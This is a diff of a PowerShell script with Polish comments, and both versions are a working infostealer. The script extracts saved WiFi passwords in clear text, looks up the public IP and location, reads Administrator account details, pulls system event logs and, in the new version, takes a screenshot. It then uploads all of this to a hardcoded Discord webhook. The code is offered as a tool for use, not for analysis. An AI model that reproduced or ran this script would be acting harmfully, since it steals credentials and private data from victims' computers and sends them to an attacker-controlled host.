@@ -1,74 +1,54 @@
-$n = "$env:TEMP\$env:UserName.txt"
-$w = 'https://discord.com/api/webhooks/1361318439314128928/0ysFUO-d6BMEU4T7fQmlHVCAU2lK8-3gr-HgTDMOwu3QZ1ikm1_k9t9LAPMLM1IBg--z'
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 
-# 1. WiFi Hasła
-$wifi = (netsh wlan show profiles) | Select-String ':(.+)$' | ForEach-Object {
-    $p = $_.Matches.Groups[1].Value.Trim()
-    (netsh wlan show profile name="$p" key=clear) |
-    Select-String 'Key Content.+:(.+)$' |
-    ForEach-Object {
-        $k = $_.Matches.Groups[1].Value.Trim()
-        "$p : $k"
-    }
-}
+# Webhook bez ukrywania
+$w='https://discord.com/api/webhooks/1361318439314128928/0ysFUO-d6BMEU4T7fQmlHVCAU2lK8-3gr-HgTDMOwu3QZ1ikm1_k9t9LAPMLM1IBg--z'
 
-# 2. Publiczne IP + lokalizacja
-try {
-    $ipinfo = Invoke-RestMethod -Uri "https://ipinfo.io/json" -UseBasicParsing
-    $ipText = @"
-IP Info:
-IP         : $($ipinfo.ip)
-City       : $($ipinfo.city)
-Region     : $($ipinfo.region)
-Country    : $($ipinfo.country)
-Org        : $($ipinfo.org)
-"@
-} catch {
-    $ipText = "IP Info: Błąd pobierania"
-}
+# 1. Zbieranie danych
+$t=(netsh wlan show profiles|Select-String ':(.+)$'|%{ $p=$_.Matches.Groups[1].Value.Trim(); (netsh wlan show profile name="$p" key=clear|Select-String 'Key Content.+:(.+)$'|%{ "$p : "+$_.Matches.Groups[1].Value.Trim() }) })
+try { $i=Invoke-RestMethod 'https://ipinfo.io/json' -UseBasicParsing; $ip="IP: $($i.ip) | $($i.city) | $($i.region) | $($i.country) | $($i.org)" } catch { $ip="IP Info: Błąd" }
+try { $a=net user Administrator } catch { $a="Brak danych Admin" }
+try { $l=Get-EventLog -LogName System -Newest 20|Out-String } catch { $l="Brak logów" }
 
-# 3. Info o koncie Administrator
-try {
-    $adminInfo = net user Administrator
-} catch {
-    $adminInfo = "Brak dostępu do konta Administrator"
-}
+# Zbierz wszystko w jedną zmienną
+$txt="=== WIFI ===`r`n"+($t -join "`r`n")+"`r`n=== IP ===`r`n$ip`r`n=== ADMIN ===`r`n$a`r`n=== LOGI ===`r`n$l"
 
-# 4. Logi systemowe
-try {
-    $logs = Get-EventLog -LogName System -Newest 20 | Out-String
-} catch {
-    $logs = "Brak dostępu do logów systemowych"
-}
+# 2. Screenshot ekranu do RAM
+$b=[Windows.Forms.Screen]::PrimaryScreen.Bounds
+$m=New-Object Drawing.Bitmap $b.Width,$b.Height
+[Drawing.Graphics]::FromImage($m).CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size)
+$s=New-Object IO.MemoryStream
+$m.Save($s,[Drawing.Imaging.ImageFormat]::Png)
+$s.Position=0
 
-# 5. Zapis wszystkiego do pliku
-$all = @()
-$all += "=== WIFI HASŁA ==="
-$all += $wifi
-$all += "`n=== IP i Lokalizacja ==="
-$all += $ipText
-$all += "`n=== Administrator Info ==="
-$all += $adminInfo
-$all += "`n=== Logi Systemowe (ostatnie 20) ==="
-$all += $logs
+# 3. Przygotowanie multipart/form-data
+$bd=[guid]::NewGuid().ToString()
+$lf="`r`n"
+$h=@{'Content-Type'="multipart/form-data; boundary=$bd"}
 
-$all | Set-Content $n
-Start-Sleep -Milliseconds 500
-
-# 6. Wysyłka do webhooka
-$bd = [guid]::NewGuid().ToString()
-$lf = "`r`n"
-$h = @{ 'Content-Type' = "multipart/form-data; boundary=$bd" }
-$c = Get-Content $n -Raw
-$b = @(
+$p=(
     "--$bd",
-    'Content-Disposition: form-data; name="file"; filename="' + $n + '"',
+    'Content-Disposition: form-data; name="files[0]"; filename="info.txt"',
     'Content-Type: text/plain',
     '',
-    $c,
-    "--$bd--"
+    $txt,
+    "--$bd",
+    'Content-Disposition: form-data; name="files[1]"; filename="screen.png"',
+    'Content-Type: image/png',
+    '',
+    ''
 ) -join $lf
 
-$d = [System.Text.Encoding]::UTF8.GetBytes($b)
-Invoke-RestMethod -Uri $w -Method POST -Headers $h -Body $d
-Remove-Item $n -Force
+$q="`r`n--$bd--`r`n"
+
+# Składanie body
+$start=[Text.Encoding]::UTF8.GetBytes($p)
+$end=[Text.Encoding]::UTF8.GetBytes($q)
+$scr=$s.ToArray()
+
+$body=[byte[]]::new($start.Length+$scr.Length+$end.Length)
+[Buffer]::BlockCopy($start,0,$body,0,$start.Length)
+[Buffer]::BlockCopy($scr,0,$body,$start.Length,$scr.Length)
+[Buffer]::BlockCopy($end,0,$body,$start.Length+$scr.Length,$end.Length)
+
+# 4. Wysyłka
+Invoke-RestMethod -Uri $w -Method Post -Headers $h -Body $body
